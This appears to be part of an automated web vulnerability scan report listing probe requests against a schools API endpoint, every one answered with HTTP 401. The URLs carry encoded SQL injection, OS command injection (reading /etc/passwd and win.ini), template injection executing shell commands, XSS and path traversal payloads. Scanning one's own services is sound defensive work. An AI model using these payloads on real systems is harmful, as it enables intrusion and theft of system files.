* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%253Bsleep+15.0%253B%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%253Bstart-sleep+-s+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%257Ctimeout+%252FT+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+%252F+sleep%252815%2529+%252F+%2522&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+UNION+ALL+select+NULL+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2526cat+%252Fetc%252Fpasswd%2526&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2526sleep+15.0%2526&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2526timeout+%252FT+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2526sleep+15.0%2526%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2526timeout+%252FT+15.0%2526%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2528&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%2529+UNION+ALL+select+NULL+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%253Bget-help&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%253Bsleep+15.0%253B%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%253Bstart-sleep+-s+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%257Ctimeout+%252FT+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+%252F+sleep%252815%2529+%252F+%2527&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+AND+%25271%2527%253D%25271%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+AND+%25271%2527%253D%25272%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+OR+%25271%2527%253D%25271%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+UNION+ALL+select+NULL+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529+UNION+ALL+select+NULL+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bcat+%252Fetc%252Fpasswd%253B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bget-help&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bget-help+%2523&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bsleep+15.0%253B&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bstart-sleep+-s+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%253Bstart-sleep+-s+15.0+%2523&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%257Ctimeout+%252FT+15.0&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%252Bresponse.write%252812%252C162*273%252C265%2529%252B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2522java.lang.Thread.sleep%2522%252815000%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2523%257B%2525x%2528sleep+15%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252F%252F980414377652208366.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252Fschools
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%252FWEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
